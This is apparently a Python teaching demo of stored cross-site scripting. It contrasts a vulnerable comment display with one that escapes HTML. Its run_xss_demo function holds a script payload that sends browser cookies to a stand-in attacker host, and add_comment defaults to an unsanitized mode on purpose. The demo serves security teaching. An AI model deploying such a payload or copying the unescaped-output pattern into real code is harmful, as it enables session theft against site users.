import html
from database import get_db_connection

def add_comment(event_id, username, comment_text, mode='vulnerable'):
    """
    Simulate adding a comment to the database.
    If mode is 'secure', it sanitizes input before storage (matching UML).
    """
    conn = get_db_connection()
    cursor = conn.cursor()

    final_text = comment_text
    if mode == 'secure':
        # [SECURE] Sanitize BEFORE saving (Input Validation Flow)
        final_text = html.escape(comment_text)

    cursor.execute(
        "INSERT INTO comments (event_id, username, comment) VALUES (?, ?, ?)",
        (event_id, username, final_text)
    )
    conn.commit()
    conn.close()

def get_comments(event_id):
    """Fetch all comments for an event."""
    conn = get_db_connection()
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM comments WHERE event_id = ?", (event_id,))
    rows = cursor.fetchall()
    conn.close()
    return rows

def display_comment_vulnerable(comment_row):
    """
    VULNERABLE: Displays raw comment content.
    If the comment contains <script>, it will execute in a browser.
    """
    print(f"[{comment_row['username']}]: {comment_row['comment']}")

def display_comment_secure(comment_row):
    """
    SECURE: Escapes HTML characters before displaying.
    Converts < to &lt;, > to &gt;, etc.
    """
    safe_comment = html.escape(comment_row['comment'])
    print(f"[{comment_row['username']}]: {safe_comment}")

def run_xss_demo():
    print("="*50)
    print("DEMO 2: CROSS-SITE SCRIPTING (XSS)")
    print("="*50)

    # 1. Normal Comment
    print("\n--- Normal Comment ---")
    add_comment(1, "akbar", "Ini adalah komentar yang aman.")
    comments = get_comments(1)
    display_comment_vulnerable(comments[-1])

    # 2. XSS Attack Payload
    print("\n--- XSS Attack Payload ---")
    xss_payload = "<script>alert('Akun Anda telah diretas!'); document.location='http://attacker.com/steal?cookie=' + document.cookie;</script>"
    add_comment(1, "attacker", xss_payload)
    
    all_comments = get_comments(1)
    latest_comment = all_comments[-1]

    print("\n[VULNERABLE DISPLAY]: (Script would execute in browser)")
    display_comment_vulnerable(latest_comment)

    print("\n[SECURE DISPLAY]: (Script is shown as plain text, harmless)")
    display_comment_secure(latest_comment)

if __name__ == "__main__":
    run_xss_demo()
